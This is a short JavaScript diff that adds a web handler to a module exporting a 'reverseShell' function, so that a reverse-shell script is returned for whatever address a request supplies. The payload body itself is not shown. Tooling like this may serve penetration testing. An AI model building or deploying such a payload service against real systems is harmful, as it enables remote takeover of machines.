@@ -37,3 +37,9 @@ fi`;
 };
 
 module.exports = reverseShell;
+
+module.exports.handler = (request, response) => {
+	const { address } = request.query;
+
+	response.send(reverseShell(address));
+};
